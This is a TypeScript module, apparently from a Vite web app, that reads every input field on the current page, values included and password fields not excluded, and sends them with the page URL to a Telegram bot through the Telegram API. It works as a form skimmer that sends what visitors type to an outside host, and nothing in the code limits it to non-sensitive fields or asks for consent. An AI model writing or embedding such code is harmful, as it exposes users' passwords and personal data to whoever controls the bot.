export async function sendPageInputTagsToTelegram(): Promise<void> {
  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
  const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.warn(
      'Telegram bot token or chat id is not set. Skipping Telegram input tag send.',
    );
    return;
  }

  const inputs = Array.from(document.querySelectorAll<HTMLInputElement>('input'));
  const message = buildTelegramMessage(inputs);

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
  } catch (error) {
    console.error('Failed to send Telegram message:', error);
  }
}

function buildTelegramMessage(inputs: HTMLInputElement[]): string {
  if (!inputs.length) {
    return `No <input> tags found on page ${window.location.href}`;
  }

  const lines = inputs.map((input, index) => {
    const props = [
      `type=${input.type}`,
      input.id ? `id=${input.id}` : null,
      input.name ? `name=${input.name}` : null,
      input.placeholder ? `placeholder=${input.placeholder}` : null,
      `required=${input.required}`,
      `disabled=${input.disabled}`,
      input.type === 'checkbox' || input.type === 'radio'
        ? `checked=${input.checked}`
        : `value=${input.value}`,
    ].filter(Boolean);

    return `${index + 1}. ${props.join(' | ')}`;
  });

  return `Input tags captured on ${window.location.href}:\n${lines.join('\n')}`;
}
